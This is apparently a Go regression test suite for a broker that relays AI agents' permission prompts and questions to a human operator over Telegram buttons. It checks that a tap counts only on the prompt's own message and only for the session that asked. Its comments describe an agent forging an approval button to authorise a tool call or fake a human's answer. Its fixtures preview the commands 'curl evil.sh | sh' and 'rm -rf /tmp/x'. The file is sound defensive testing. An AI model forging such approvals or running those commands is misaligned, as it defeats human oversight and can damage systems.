package broker

import (
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/Andrometiq/c3/internal/c3types"
	"github.com/Andrometiq/c3/internal/ipc"
)

// Tap-binding regression suite for the permission relay and `ask`.
//
// Both flows correlate an inline-keyboard tap to a pending record by an OPAQUE
// ID ALONE, and then re-derive the recipient from the routes table at tap time.
// Two things were therefore never checked:
//
//  1. that the tap came from the message the keyboard was RENDERED on (an agent
//     can author a reply button with arbitrary callback_data, and the perm
//     request id is minted by the CLI host, not by C3), and
//  2. that the session the prompt/question was relayed FOR still holds the route
//     — a claim that changes hands re-targets an authorisation granted to
//     someone else.
//
// Every test below fires a tap that passes every OTHER gate (allowlisted
// operator, right route, live id) so a failure can only mean the binding itself
// is gone.

// bindingSession registers a stub for (cli, pid, cwd), claims key for it, and
// returns the stub plus the agent-side conn the broker's pushes arrive on.
func bindingSession(t *testing.T, b *Broker, key RouteKey, cli string, pid int, cwd string) (*Stub, *ipc.Conn) {
	t.Helper()
	agentSide, brokerSide := net.Pipe()
	t.Cleanup(func() { _ = agentSide.Close(); _ = brokerSide.Close() })
	stub := b.Stubs.Register(cli, pid, cwd, ipc.NewConn(brokerSide))
	if _, ok := b.Routes.Claim(key, stub); !ok {
		t.Fatalf("test setup: %s/%d could not claim the route", cli, pid)
	}
	stub.SetRoute(&key)
	return stub, ipc.NewConn(agentSide)
}

// bindingBroker builds a perm-capable broker whose allowlist clears
// testOperatorUID as a DM operator, with session A (claude/4242//work) holding
// key. Returns the broker, the fake channel, A's stub and A's agent-side conn.
func bindingBroker(t *testing.T, key RouteKey) (*Broker, *permFakeChannel, *Stub, *ipc.Conn) {
	t.Helper()
	mf := mfWithTelegram()
	mf.AddAllowedUser(testOperatorUID)
	fc := &permFakeChannel{fakeChannel: fakeChannel{caps: &c3types.Capabilities{Channel: "telegram", InlineKeyboards: true}}}
	b := brokerWithPermChannel(t, mf, fc)
	stubA, connA := bindingSession(t, b, key, "claude", 4242, "/work")
	return b, fc, stubA, connA
}

// stealRoute evicts key's current holder the way a user-confirmed force_steal
// does (attach.go tryClaim) and grants it to a brand-new, unrelated session.
func stealRoute(t *testing.T, b *Broker, key RouteKey) (*Stub, *ipc.Conn) {
	t.Helper()
	if evicted := b.Routes.ForceReleaseKey(key); evicted != nil {
		evicted.ClearRouteIf(key)
	}
	return bindingSession(t, b, key, "codex", 777, "/somewhere-else")
}

// permFrames funnels every permission verdict the broker writes to one session's
// conn into a channel, so a test can assert both "nothing arrived" and "exactly
// this arrived" without racing net.Pipe's blocking writes.
func permFrames(conn *ipc.Conn) <-chan ipc.PermissionVerdictMsg {
	out := make(chan ipc.PermissionVerdictMsg, 4)
	go func() {
		defer close(out)
		for {
			raw, err := conn.ReadFrame()
			if err != nil {
				return
			}
			var m ipc.PermissionVerdictMsg
			_ = json.Unmarshal(raw, &m)
			out <- m
		}
	}()
	return out
}

// askFrames is permFrames for ask answers.
func askFrames(conn *ipc.Conn) <-chan ipc.AskResultMsg {
	out := make(chan ipc.AskResultMsg, 4)
	go func() {
		defer close(out)
		for {
			raw, err := conn.ReadFrame()
			if err != nil {
				return
			}
			var m ipc.AskResultMsg
			_ = json.Unmarshal(raw, &m)
			out <- m
		}
	}()
	return out
}

// TestResolvePerm_TapMustMatchPromptMessage: a tap carrying a LIVE request id but
// rendered on a different message must not spend the verdict.
//
// The request id is minted by the CLI host and parsePermCallback validates
// nothing about it, while an agent may author a reply keyboard with arbitrary
// callback_data — so without a message check, a "perm:allow:<id>" button planted
// anywhere in the topic (or a stale keyboard left live by a failed clear, after
// the host re-mints the id) authorises a tool use the operator never read.
func TestResolvePerm_TapMustMatchPromptMessage(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, stubA, connA := bindingBroker(t, key)
	defer b.Shutdown()
	verdicts := permFrames(connA)

	if !b.registerPerm(&pendingPerm{
		requestID: "abcde", route: key, toolName: "Bash", preview: "rm -rf /tmp/x", messageID: 500,
		owner: stubA,
	}) {
		t.Fatal("test setup: registerPerm failed")
	}
	op := c3types.Sender{UserID: testOperatorUID}

	// The tap passes every other gate: allowlisted operator, right route, live id.
	// Only the message it was rendered on differs.
	if b.resolvePerm(key, &c3types.CallbackEvent{
		CallbackID: "cb-foreign", Data: "perm:allow:abcde", MessageID: 501, Actor: op,
	}) {
		t.Fatal("a tap rendered on a DIFFERENT message than the prompt resolved the permission: the perm tap is not bound to the prompt message, so any agent-authored button carrying a live request id spends a real verdict")
	}
	select {
	case m, ok := <-verdicts:
		if ok {
			t.Fatalf("a foreign-message tap pushed a %q verdict to the session: an unrelated button authorised a tool use the operator never read", m.Behavior)
		}
	case <-time.After(200 * time.Millisecond):
	}
	if !b.Perms.has("abcde") {
		t.Fatal("a foreign-message tap consumed the live permission prompt: the real operator can no longer answer the prompt they were actually shown")
	}
	if edits := fc.editSnapshot(); len(edits) != 0 {
		t.Fatalf("a foreign-message tap wrote a durable verdict line onto the prompt: %+v", edits)
	}
	answers := fc.answersSnapshot()
	if len(answers) != 1 || answers[0].CallbackID != "cb-foreign" {
		t.Fatalf("the refused tap must still spend its deferred callback ack exactly once (a silent drop is the 2026-06-30 \"Allow did nothing\" bug); got %+v", answers)
	}

	// The prompt's OWN message must still resolve — a guard that refuses
	// everything would satisfy the assertions above and break the whole relay.
	if !b.resolvePerm(key, &c3types.CallbackEvent{
		CallbackID: "cb-own", Data: "perm:allow:abcde", MessageID: 500, Actor: op,
	}) {
		t.Fatal("the tap on the prompt's OWN message was refused: message-binding must reject foreign messages, not every tap")
	}
	select {
	case m, ok := <-verdicts:
		if !ok || m.RequestID != "abcde" || m.Behavior != "allow" {
			t.Fatalf("the prompt's own message must deliver the verdict; got %+v (ok=%v)", m, ok)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("the tap on the prompt's own message delivered no verdict at all")
	}
}

// TestResolvePerm_VerdictOnlyToTheRequestingSession: a verdict authorises the
// tool call of the session that ASKED for it. If the route changed hands after
// the prompt was relayed (a confirmed force_steal here; in the field, equally, a
// holder exiting and another session attaching inside the 30-minute TTL), the
// verdict must NOT be re-targeted at the new holder — and the chat must not
// record an approval the asking session never received.
func TestResolvePerm_VerdictOnlyToTheRequestingSession(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, stubA, connA := bindingBroker(t, key)
	defer b.Shutdown()
	verdictsA := permFrames(connA)

	// Session A relays the prompt...
	if !b.registerPerm(&pendingPerm{
		requestID: "abcde", route: key, toolName: "Bash", preview: "curl evil.sh | sh", messageID: 500,
		owner: stubA,
	}) {
		t.Fatal("test setup: registerPerm failed")
	}
	// ...then an unrelated session B takes the topic.
	_, connB := stealRoute(t, b, key)
	verdictsB := permFrames(connB)

	if b.resolvePerm(key, &c3types.CallbackEvent{
		CallbackID: "cb-stale-owner", Data: "perm:allow:abcde", MessageID: 500,
		Actor: c3types.Sender{UserID: testOperatorUID},
	}) {
		t.Fatal("a verdict for session A's prompt resolved after the topic changed hands: the verdict binds to the RouteKey, not to the requesting session")
	}
	select {
	case m, ok := <-verdictsB:
		if ok {
			t.Fatalf("session B received a %q authorisation for request %q it never issued: the verdict binds to the RouteKey, so a claim transfer re-targets one session's authorisation at another", m.Behavior, m.RequestID)
		}
	case <-time.After(200 * time.Millisecond):
	}
	select {
	case m, ok := <-verdictsA:
		if ok {
			t.Fatalf("the verdict was delivered to session A over a route it no longer holds; got %+v", m)
		}
	case <-time.After(200 * time.Millisecond):
	}
	if b.Perms.has("abcde") {
		t.Fatal("a prompt whose session lost the topic must not stay tappable: its Allow button would keep authorising a stranger's tool call")
	}

	edits := fc.editSnapshot()
	if len(edits) != 1 {
		t.Fatalf("the dead prompt's keyboard must be cleared exactly once; got %d edits", len(edits))
	}
	if strings.Contains(edits[0].Text, "Allowed") {
		t.Fatalf("the chat recorded %q — a durable audit line asserting an approval that no session ever received", edits[0].Text)
	}
	if edits[0].Buttons == nil || len(edits[0].Buttons) != 0 {
		t.Fatalf("the dead prompt must have its Allow/Deny keyboard cleared (non-nil empty Buttons); got %+v", edits[0].Buttons)
	}
	answers := fc.answersSnapshot()
	if len(answers) != 1 || !answers[0].ShowAlert || !strings.Contains(answers[0].Text, "no longer holds") {
		t.Fatalf("the operator must be told the verdict was NOT delivered, as an alert; got %+v", answers)
	}
}

// TestResolvePerm_VerdictSurvivesAdapterReconnect is the other half of the
// owner check: a routine adapter reconnect registers a FRESH stub (new ConnID)
// for the SAME logical session and transfers the claim to it. That is still the
// session that asked, so its verdict must still be delivered. Without the
// logical-session arm the owner check would silently break every permission
// prompt across a broker/adapter reconnect.
func TestResolvePerm_VerdictSurvivesAdapterReconnect(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, _, stubA, _ := bindingBroker(t, key)
	defer b.Shutdown()

	if !b.registerPerm(&pendingPerm{
		requestID: "abcde", route: key, toolName: "Read", preview: "cat README.md", messageID: 500,
		owner: stubA,
	}) {
		t.Fatal("test setup: registerPerm failed")
	}

	// Same CLI/PID/CWD, new connection — Routes.Claim treats it as a reconnect.
	reconnected, connA2 := bindingSession(t, b, key, "claude", 4242, "/work")
	if reconnected == stubA {
		t.Fatal("test setup: the reconnect must produce a DIFFERENT stub, or this proves nothing")
	}
	verdicts := permFrames(connA2)

	if !b.resolvePerm(key, &c3types.CallbackEvent{
		CallbackID: "cb-reconnect", Data: "perm:allow:abcde", MessageID: 500,
		Actor: c3types.Sender{UserID: testOperatorUID},
	}) {
		t.Fatal("a verdict was refused after the SAME session reconnected: the owner check must recognise a logical-session reconnect, not just pointer identity")
	}
	select {
	case m, ok := <-verdicts:
		if !ok || m.Behavior != "allow" {
			t.Fatalf("the reconnected session must receive its own verdict; got %+v (ok=%v)", m, ok)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("the reconnected session received no verdict: a routine reconnect silently loses every pending permission prompt")
	}
}

// TestResolveAsk_TapMustMatchQuestionMessage: same binding for `ask`. A planted
// "ask:<liveID>:<n>" button elsewhere in the topic must not answer the question —
// it would rewrite the question's durable body to "✅ <option>" (a fabricated
// consent record) and hand the asking agent an answer no human chose.
func TestResolveAsk_TapMustMatchQuestionMessage(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, stubA, connA := bindingBroker(t, key)
	defer b.Shutdown()
	answers := askFrames(connA)

	if !b.registerAsk(&pendingAsk{
		askID: "abc12345", route: key, question: "Pick one",
		options: []string{"A", "B", "C"}, selected: make([]bool, 3), messageID: 700,
		owner: stubA,
	}) {
		t.Fatal("test setup: registerAsk failed")
	}

	if b.resolveAsk(key, &c3types.CallbackEvent{Data: "ask:abc12345:1", MessageID: 701}) {
		t.Fatal("a tap rendered on a DIFFERENT message than the question resolved the ask: the answer is not bound to the question message, so an agent-authored button can fabricate a human's choice")
	}
	select {
	case m, ok := <-answers:
		if ok {
			t.Fatalf("a foreign-message tap delivered answer %+v to the asking session", m.Answer)
		}
	case <-time.After(200 * time.Millisecond):
	}
	if !b.Asks.has("abc12345") {
		t.Fatal("a foreign-message tap consumed the live question: the human can no longer answer the question they were actually shown")
	}
	if edits := fc.editSnapshot(); len(edits) != 0 {
		t.Fatalf("a foreign-message tap rewrote the question's durable body — a fabricated consent record: %+v", edits)
	}

	// The question's OWN message must still resolve.
	if !b.resolveAsk(key, &c3types.CallbackEvent{Data: "ask:abc12345:1", MessageID: 700}) {
		t.Fatal("the tap on the question's OWN message was refused: message-binding must reject foreign messages, not every tap")
	}
	select {
	case m, ok := <-answers:
		if !ok || len(m.Answer.Selected) != 1 || m.Answer.Selected[0] != "B" {
			t.Fatalf("the question's own message must deliver the chosen option; got %+v (ok=%v)", m, ok)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("the tap on the question's own message delivered no answer at all")
	}
}

// TestResolveAsk_AnswerOnlyToTheAskingSession: an ask answer is delivered to
// whoever holds the route at tap time, so a claim transfer would hand session A's
// answer to session B — and rewrite the chat to say the question was answered.
func TestResolveAsk_AnswerOnlyToTheAskingSession(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, stubA, connA := bindingBroker(t, key)
	defer b.Shutdown()
	answersA := askFrames(connA)

	if !b.registerAsk(&pendingAsk{
		askID: "abc12345", route: key, question: "Deploy to prod?",
		options: []string{"Yes", "No"}, selected: make([]bool, 2), messageID: 700,
		owner: stubA,
	}) {
		t.Fatal("test setup: registerAsk failed")
	}
	_, connB := stealRoute(t, b, key)
	answersB := askFrames(connB)

	if b.resolveAsk(key, &c3types.CallbackEvent{Data: "ask:abc12345:0", MessageID: 700}) {
		t.Fatal("session A's question resolved after the topic changed hands: the answer binds to the RouteKey, not to the asking session")
	}
	select {
	case m, ok := <-answersB:
		if ok {
			t.Fatalf("session B received answer %+v for question %q it never asked: a claim transfer re-targets one session's answer at another", m.Answer, m.AskID)
		}
	case <-time.After(200 * time.Millisecond):
	}
	select {
	case m, ok := <-answersA:
		if ok {
			t.Fatalf("the answer was delivered to session A over a route it no longer holds; got %+v", m)
		}
	case <-time.After(200 * time.Millisecond):
	}
	if edits := fc.editSnapshot(); len(edits) != 0 {
		t.Fatalf("the chat recorded an answer to a question no session received: %+v", edits)
	}
	if !b.Asks.has("abc12345") {
		t.Fatal("the question must stay registered so the asking session is still answerable if it re-claims the topic before askExpiryTTL")
	}
}

// ─── the registration window (TOCTOU 1) ────────────────────────────────────
//
// Both registration sites resolve the requesting session FIRST (stub.CurrentRoute)
// and only then register the pending record. Deriving the owner at REGISTER time
// re-read the routes table across that gap, so anything that changed hands in it —
// a user-confirmed force_steal, a holder exiting and another session attaching —
// became the owner of a request it never made. The two tests below drive exactly
// that window: the steal fires inside Capabilities(), which the handler calls
// between resolving the session and registering.

// stubIdent renders a session identity for a failure message (the whole Stub is
// unreadable noise in test output).
func stubIdent(s *Stub) string {
	if s == nil {
		return "<none>"
	}
	return fmt.Sprintf("%s/pid=%d/conn=%d", s.CLI, s.PID, s.ConnID)
}

// permOwnerOf reads the recorded owner of a live pending perm without consuming it.
func permOwnerOf(b *Broker, requestID string) (*Stub, bool) {
	b.Perms.mu.Lock()
	defer b.Perms.mu.Unlock()
	p, ok := b.Perms.m[requestID]
	if !ok {
		return nil, false
	}
	return p.owner, true
}

// askOwnerOf is permOwnerOf for a pending ask.
func askOwnerOf(b *Broker, askID string) (*Stub, bool) {
	b.Asks.mu.Lock()
	defer b.Asks.mu.Unlock()
	p, ok := b.Asks.m[askID]
	if !ok {
		return nil, false
	}
	return p.owner, true
}

// TestHandlePermissionRequest_OwnerIsTheRequesterNotTheHolderAtRegistration: the
// prompt belongs to the session whose tool call is waiting on it. If the route is
// stolen while the relay is still being set up, the newcomer must not inherit it.
func TestHandlePermissionRequest_OwnerIsTheRequesterNotTheHolderAtRegistration(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, stubA, connA := bindingBroker(t, key)
	defer b.Shutdown()
	fc.replyReturnID = 500
	verdictsA := permFrames(connA)

	// Session B force-steals the topic INSIDE the registration window.
	var stubB *Stub
	var connB *ipc.Conn
	fc.onCapabilities = func() { stubB, connB = stealRoute(t, b, key) }

	b.handlePermissionRequest(nil, stubA, mustMarshalJSON(t, ipc.PermissionReq{
		Op: ipc.OpPermissionRequest, RequestID: "abcde", ToolName: "Bash", Preview: "rm -rf /tmp/x",
	}))
	if stubB == nil {
		t.Fatal("test setup: the steal hook never fired, so nothing was raced")
	}
	verdictsB := permFrames(connB)

	owner, ok := permOwnerOf(b, "abcde")
	if !ok {
		t.Fatal("the relayed prompt was not registered at all")
	}
	if owner != stubA {
		t.Fatalf("the prompt was stamped with the session holding the route at REGISTER time, not the session that asked: owner=%s want the requesting session %s — a force_steal inside the registration window makes the newcomer the owner of another session's permission request", stubIdent(owner), stubIdent(stubA))
	}

	// And the behaviour that owner identity buys: the operator's tap must not
	// authorise session B's process to run session A's command.
	if b.resolvePerm(key, &c3types.CallbackEvent{
		CallbackID: "cb-raced", Data: "perm:allow:abcde", MessageID: 500,
		Actor: c3types.Sender{UserID: testOperatorUID},
	}) {
		t.Fatal("the verdict resolved even though the asking session lost the topic during registration")
	}
	select {
	case m, ok := <-verdictsB:
		if ok {
			t.Fatalf("session B received a %q verdict for request %q it never issued — it was stamped as owner by a routes-table read taken after it stole the topic", m.Behavior, m.RequestID)
		}
	case <-time.After(200 * time.Millisecond):
	}
	select {
	case m, ok := <-verdictsA:
		if ok {
			t.Fatalf("the verdict was delivered to session A over a route it no longer holds; got %+v", m)
		}
	case <-time.After(200 * time.Millisecond):
	}
}

// TestHandleAskRegister_OwnerIsTheRequesterNotTheHolderAtRegistration is the same
// window on the ask path.
func TestHandleAskRegister_OwnerIsTheRequesterNotTheHolderAtRegistration(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, stubA, connA := bindingBroker(t, key)
	defer b.Shutdown()
	fc.replyReturnID = 700

	// Drain A's conn: handleAskRegister writes its ack there and net.Pipe blocks.
	go func() {
		for {
			if _, err := connA.ReadFrame(); err != nil {
				return
			}
		}
	}()

	var stubB *Stub
	var connB *ipc.Conn
	fc.onCapabilities = func() { stubB, connB = stealRoute(t, b, key) }

	raw := mustMarshalJSON(t, ipc.AskRegisterReq{
		Op: ipc.OpAskRegister, AskID: "abc12345", Question: "Deploy to prod?", Options: []string{"Yes", "No"},
	})
	done := make(chan struct{})
	go func() {
		defer close(done)
		b.handleAskRegister(stubA.ConnValue().(*ipc.Conn), stubA, raw)
	}()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("handleAskRegister did not return")
	}
	if stubB == nil {
		t.Fatal("test setup: the steal hook never fired, so nothing was raced")
	}
	answersB := askFrames(connB)

	owner, ok := askOwnerOf(b, "abc12345")
	if !ok {
		t.Fatal("the question was not registered at all")
	}
	if owner != stubA {
		t.Fatalf("the question was stamped with the session holding the route at REGISTER time, not the session that asked: owner=%s want the asking session %s", stubIdent(owner), stubIdent(stubA))
	}
	if b.resolveAsk(key, &c3types.CallbackEvent{Data: "ask:abc12345:0", MessageID: 700}) {
		t.Fatal("the answer resolved even though the asking session lost the topic during registration")
	}
	select {
	case m, ok := <-answersB:
		if ok {
			t.Fatalf("session B received answer %+v for question %q it never asked", m.Answer, m.AskID)
		}
	case <-time.After(200 * time.Millisecond):
	}
}

// TestResolvePerm_UnownedPromptIsRefused: with every production path binding the
// requesting stub, a record with NO owner is one nobody can be shown to have
// asked for. Treating that as "nothing to compare, carry on" made the gate inert
// for exactly the records the old derive-at-register produced when the route was
// momentarily unclaimed. It must refuse.
func TestResolvePerm_UnownedPromptIsRefused(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, _, _, connA := bindingBroker(t, key)
	defer b.Shutdown()
	verdicts := permFrames(connA)

	if !b.registerPerm(&pendingPerm{
		requestID: "abcde", route: key, toolName: "Bash", preview: "rm -rf /tmp/x", messageID: 500,
	}) {
		t.Fatal("test setup: registerPerm failed")
	}
	if b.resolvePerm(key, &c3types.CallbackEvent{
		CallbackID: "cb-unowned", Data: "perm:allow:abcde", MessageID: 500,
		Actor: c3types.Sender{UserID: testOperatorUID},
	}) {
		t.Fatal("a prompt with no owning session resolved: the owner gate is INERT for an unowned record, so the verdict goes to whoever holds the route at tap time")
	}
	select {
	case m, ok := <-verdicts:
		if ok {
			t.Fatalf("an unowned prompt pushed a %q verdict to the current route holder; got %+v", m.Behavior, m)
		}
	case <-time.After(200 * time.Millisecond):
	}
}

// TestResolveAsk_UnownedQuestionIsRefused is the ask half of the same rule.
func TestResolveAsk_UnownedQuestionIsRefused(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, _, _, connA := bindingBroker(t, key)
	defer b.Shutdown()
	answers := askFrames(connA)

	if !b.registerAsk(&pendingAsk{
		askID: "abc12345", route: key, question: "Deploy to prod?",
		options: []string{"Yes", "No"}, selected: make([]bool, 2), messageID: 700,
	}) {
		t.Fatal("test setup: registerAsk failed")
	}
	if b.resolveAsk(key, &c3types.CallbackEvent{Data: "ask:abc12345:0", MessageID: 700}) {
		t.Fatal("a question with no asking session resolved: the owner gate is INERT for an unowned record")
	}
	select {
	case m, ok := <-answers:
		if ok {
			t.Fatalf("an unowned question pushed answer %+v to the current route holder", m.Answer)
		}
	case <-time.After(200 * time.Millisecond):
	}
}
